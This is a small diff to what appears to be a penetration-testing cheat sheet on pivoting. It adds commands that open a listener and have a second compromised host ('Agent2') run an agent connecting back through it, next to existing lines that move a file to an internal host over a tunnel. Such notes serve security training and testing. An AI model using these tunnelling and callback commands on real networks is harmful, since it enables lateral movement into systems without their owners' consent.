@@ -124,6 +124,9 @@ kali: listener_list
 kali: listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:80(file transfer)
 attacker_host: python3 -m http.server 80
 172.16.5.35: curl http://172.16.5.15:1235/file -o file
+
+attacker_host: listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:11601
+Agent2: agent.exe -connect 172.16.5.15:4444 -ignore-cert
 ```
 ### Windows Port forwarding
 ###### PLINK.exe
